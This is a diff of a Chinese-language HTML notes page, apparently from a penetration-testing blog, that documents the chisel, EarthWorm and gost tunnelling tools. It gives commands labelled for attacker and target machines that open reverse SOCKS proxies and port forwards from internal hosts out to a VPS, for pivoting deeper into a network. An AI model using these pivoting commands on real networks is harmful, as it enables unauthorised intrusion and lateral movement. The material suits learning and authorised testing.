     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p><a href="https://github.com/jpillora/chisel"target="_blank" rel="external nofollow noopener noreferrer">https://github.com/jpillora/chisel</a></p>
+</h2><p><a href="https://github.com/jpillora/chisel"target="_blank" rel="external nofollow noopener noreferrer">https://github.com/jpillora/chisel</a></p>
 <p>这款工具底层采用了HTTP进行传输，将TCP/UDP链接封装在HTTP隧道中，并且还使用了SSH对通信数据进行加密。</p>
-<p>####### ==代理==</p>
-<pre tabindex="0"><code>正向
+<h3 id="代理" class="heading-element"><span>==代理==</span>
+  <a href="#%e4%bb%a3%e7%90%86" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><pre tabindex="0"><code>正向
 靶机chisel.exe server -p 7788
 攻击机chisel client 110.40.177.201:7788 socks
 默认在1080端口上开启一个socks代理，当然这个端口可以改，使用$port:socks
@@ -445,8 +496,11 @@ nc -l 12345 0&lt;backpipe | nc www.google.com 80 1&gt;backpipe</code></pre><h5 i
 靶机chisel.exe client 39.101.65.187:7788 R:socks
 
 ssh -C -f -N -g -L 0.0.0.0:10080:127.0.0.1:1080 root@VPS
-把1080的流量转向10080</code></pre><p>####### ==二级代理+二级端口转发==</p>
-<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407161326949.webp" alt="image-20240716132643791" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407161326949.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407161326949.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407161326949.webp?size=large 2x" data-title="image-20240716132643791" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+把1080的流量转向10080</code></pre><h3 id="二级代理二级端口转发" class="heading-element"><span>==二级代理+二级端口转发==</span>
+  <a href="#%e4%ba%8c%e7%ba%a7%e4%bb%a3%e7%90%86%e4%ba%8c%e7%ba%a7%e7%ab%af%e5%8f%a3%e8%bd%ac%e5%8f%91" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407161326949.webp" alt="image-20240716132643791" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407161326949.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407161326949.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407161326949.webp?size=large 2x" data-title="image-20240716132643791" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
 <p>代理</p>
 <pre tabindex="0"><code>kali:
 chisel server -p 3333 --reverse
@@ -473,8 +527,11 @@ chisel client 192.168.126.132:3333 R:1111:127.0.0.1:5555
 web02:
 chisel client 192.168.150.128:2222 R:5555:192.168.59.129:80
 在 kali 上访问 127.0.0.1:1111，即可访问 192.168.59.129 的 80 端口</code></pre><p>chisel client 110.40.177.201:7788 R:4444:socks</p>
-<p>####### ==端口转发==</p>
-<pre tabindex="0"><code>正向
+<h3 id="端口转发" class="heading-element"><span>==端口转发==</span>
+  <a href="#%e7%ab%af%e5%8f%a3%e8%bd%ac%e5%8f%91" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><pre tabindex="0"><code>正向
 靶机chisel server -p 12345
 攻击机chisel.exe client 192.168.61.128:12345 11111:127.0.0.1:8000
 这时我们就将靶机的8000端口转发到攻击机的11111端口上了，此时在攻击机上访问127.0.0.1:11111
@@ -483,11 +540,11 @@ chisel client 192.168.150.128:2222 R:5555:192.168.59.129:80
 攻击机chisel.exe server -p 7788 --reverse
 靶机chisel client 192.168.61.129:12345 R:11111:127.0.0.1:7788
     chisel.exe client -v VPS:6666 R:0.0.0.0:33389:192.168.223.151:3389</code></pre><p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202405201631846.webp" alt="image-20240520163114594" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202405201631846.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202405201631846.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202405201631846.webp?size=large 2x" data-title="image-20240520163114594" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
-<h6 id="earthworm" class="heading-element"><span>0.0.0.3.2  EarthWorm</span>
+<h2 id="earthworm" class="heading-element"><span>EarthWorm</span>
   <a href="#earthworm" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p><a href="https://www.freebuf.com/sectool/282993.html"target="_blank" rel="external nofollow noopener noreferrer">https://www.freebuf.com/sectool/282993.html</a></p>
+</h2><p><a href="https://www.freebuf.com/sectool/282993.html"target="_blank" rel="external nofollow noopener noreferrer">https://www.freebuf.com/sectool/282993.html</a></p>
 <p>EW 是一套便携式的网络穿透工具，既支持SOCKS5代理转发，又支持静态端口转发。</p>
 <p>该工具共有6种命令格式（ssocksd、rcsocks、rssocks、lcx_slave、lcx_listen、lcx_tran）</p>
 <p>该工具共有6种命令格式（ssocksd、rcsocks、rssocks、lcx_listen、lcx_tran）</p>
@@ -520,13 +577,16 @@ rcsocks 反向socks代理客户端</code></pre><p>静态端口转发功能和lcx
 <p>首先在攻击机上开启监听：</p>
 <div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>ew.exe -s rcsocks -l <span style="color:#a6be9d">1080</span> -e <span style="color:#a6be9d">8880</span></span></span></code></pre></div><p>外网服务器向攻击机8880端口发起连接：</p>
 <div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#58a1dd">ew</span>.<span style="color:#58a1dd">exe</span> <span style="color:#ff636f">-</span><span style="color:#58a1dd">s</span> <span style="color:#58a1dd">rssocks</span><span style="color:#ff636f">-</span><span style="color:#58a1dd">d</span> <span style="color:#a6be9d">192.168</span>.<span style="color:#a6be9d">3.1</span> <span style="color:#ff636f">-</span><span style="color:#58a1dd">e</span> <span style="color:#a6be9d">8880</span></span></span></code></pre></div><p>然后代理连接本地的1080就好了</p>
-<h6 id="gost" class="heading-element"><span>0.0.0.3.3  gost</span>
+<h2 id="gost" class="heading-element"><span>gost</span>
   <a href="#gost" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p><a href="https://v2.gost.run/"target="_blank" rel="external nofollow noopener noreferrer">https://v2.gost.run/</a></p>
-<p>####### 常用</p>
-<p>反向代理</p>
+</h2><p><a href="https://v2.gost.run/"target="_blank" rel="external nofollow noopener noreferrer">https://v2.gost.run/</a></p>
+<h3 id="常用" class="heading-element"><span>常用</span>
+  <a href="#%e5%b8%b8%e7%94%a8" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>反向代理</p>
 <pre tabindex="0"><code>// vps 106.53.104.88
 gost -L socks5://:11122
 // 内网主机
@@ -535,8 +595,11 @@ gost -L=rtcp://:58811/0.0.0.0:65143 -F=socks5://vps:11122
 
 Server side: gost -L=socks5://:1080
 Client side: gost -L=:8080 -F=socks5://vps:1080?notls=true</code></pre><p>正向代理</p>
-<p>####### 启动参数</p>
-<p>GOST目前有以下几个参数项：</p>
+<h3 id="启动参数" class="heading-element"><span>启动参数</span>
+  <a href="#%e5%90%af%e5%8a%a8%e5%8f%82%e6%95%b0" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>GOST目前有以下几个参数项：</p>
 <blockquote>
 <p><code>-L</code> - 指定本地服务配置，可设置多个。</p>
 <p><code>-F</code> - 指定转发服务配置，可设置多个，构成转发链。</p>
@@ -544,8 +607,11 @@ Client side: gost -L=:8080 -F=socks5://vps:1080?notls=true</code></pre><p>正向
 <p><code>-D</code> - 开启Debug模式，更详细的日志输出。</p>
 <p><code>-V</code> - 查看版本，显示当前运行的gost版本号。</p>
 </blockquote>
-<p>####### 配置文件</p>
-<p>除了通过命令行直接配置服务外，也可以通过<code>-C</code>参数指定外部配置文件来设置参数：</p>
+<h3 id="配置文件" class="heading-element"><span>配置文件</span>
+  <a href="#%e9%85%8d%e7%bd%ae%e6%96%87%e4%bb%b6" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>除了通过命令行直接配置服务外，也可以通过<code>-C</code>参数指定外部配置文件来设置参数：</p>
 <pre tabindex="0"><code>gost -C gost.json</code></pre><p>配置文件为标准<code>json</code>格式：</p>
 <pre tabindex="0"><code>{
     &#34;Debug&#34;: true,
@@ -603,56 +669,92 @@ Client side: gost -L=:8080 -F=socks5://vps:1080?notls=true</code></pre><p>正向
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">kill</span> <span style="color:#58a1dd">PID</span>
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">例如，如果要终止PID为12345的进程，执行以下命令：</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#58a1dd">kill</span> <span style="color:#a6be9d">12345</span></span></span></code></pre></div><p>####### 代理模式</p>
-<p>开启一个或多个代理服务，并可以设置转发链进行转发。</p>
-<p>######## 开启一个HTTP代理服务</p>
-<p>命令行配置文件</p>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">kill</span> <span style="color:#a6be9d">12345</span></span></span></code></pre></div><h3 id="代理模式" class="heading-element"><span>代理模式</span>
+  <a href="#%e4%bb%a3%e7%90%86%e6%a8%a1%e5%bc%8f" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>开启一个或多个代理服务，并可以设置转发链进行转发。</p>
+<h4 id="开启一个http代理服务" class="heading-element"><span>开启一个HTTP代理服务</span>
+  <a href="#%e5%bc%80%e5%90%af%e4%b8%80%e4%b8%aahttp%e4%bb%a3%e7%90%86%e6%9c%8d%e5%8a%a1" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p>命令行配置文件</p>
 <pre tabindex="0"><code>gost -L http://:8080</code></pre><p>启动一个监听在8080端口的HTTP代理服务。</p>
-<p>######## 开启多个代理服务</p>
-<p>命令行配置文件</p>
+<h4 id="开启多个代理服务" class="heading-element"><span>开启多个代理服务</span>
+  <a href="#%e5%bc%80%e5%90%af%e5%a4%9a%e4%b8%aa%e4%bb%a3%e7%90%86%e6%9c%8d%e5%8a%a1" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p>命令行配置文件</p>
 <pre tabindex="0"><code>gost -L http://:8080 -L socks5://:1080 </code></pre><p>启动两个服务，一个监听在8080端口的HTTP代理服务，和一个监听在1080端口的SOCKS5代理服务。</p>
-<p>######## 使用转发</p>
-<p>命令行配置文件</p>
+<h4 id="使用转发" class="heading-element"><span>使用转发</span>
+  <a href="#%e4%bd%bf%e7%94%a8%e8%bd%ac%e5%8f%91" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p>命令行配置文件</p>
 <pre tabindex="0"><code>gost -L http://:8080 -F http://192.168.1.1:8080</code></pre><p>监听在8080端口的HTTP代理服务，使用192.168.1.1:8080做为上级代理进行转发。</p>
-<p>######## 使用多级转发(转发链)</p>
-<p>命令行配置文件</p>
+<h4 id="使用多级转发转发链" class="heading-element"><span>使用多级转发(转发链)</span>
+  <a href="#%e4%bd%bf%e7%94%a8%e5%a4%9a%e7%ba%a7%e8%bd%ac%e5%8f%91%e8%bd%ac%e5%8f%91%e9%93%be" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p>命令行配置文件</p>
 <pre tabindex="0"><code>gost -L :8080 -F http://192.168.1.1:8080 -F socks5://192.168.1.2:1080</code></pre><p>GOST按照<code>-F</code>设置的顺序将请求最终转发给192.168.1.2:1080处理。</p>
-<p>####### 转发模式</p>
-<p>更详细的使用说明请参考<a href="https://gost.run/getting-started/tutorials/port-forwarding/"target="_blank" rel="external nofollow noopener noreferrer">端口转发</a>。</p>
-<p>######## TCP本地端口转发</p>
-<p>命令行配置文件</p>
+<h3 id="转发模式" class="heading-element"><span>转发模式</span>
+  <a href="#%e8%bd%ac%e5%8f%91%e6%a8%a1%e5%bc%8f" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>更详细的使用说明请参考<a href="https://gost.run/getting-started/tutorials/port-forwarding/"target="_blank" rel="external nofollow noopener noreferrer">端口转发</a>。</p>
+<h4 id="tcp本地端口转发" class="heading-element"><span>TCP本地端口转发</span>
+  <a href="#tcp%e6%9c%ac%e5%9c%b0%e7%ab%af%e5%8f%a3%e8%bd%ac%e5%8f%91" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p>命令行配置文件</p>
 <pre tabindex="0"><code>gost -L tcp://:8080/192.168.1.1:80</code></pre><p>将本地的TCP端口8080映射到192.168.1.1的80端口，所有到本地8080端口的数据会被转发到192.168.1.1:80。</p>
-<p>######## UDP本地端口转发</p>
-<p>命令行配置文件</p>
+<h4 id="udp本地端口转发" class="heading-element"><span>UDP本地端口转发</span>
+  <a href="#udp%e6%9c%ac%e5%9c%b0%e7%ab%af%e5%8f%a3%e8%bd%ac%e5%8f%91" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p>命令行配置文件</p>
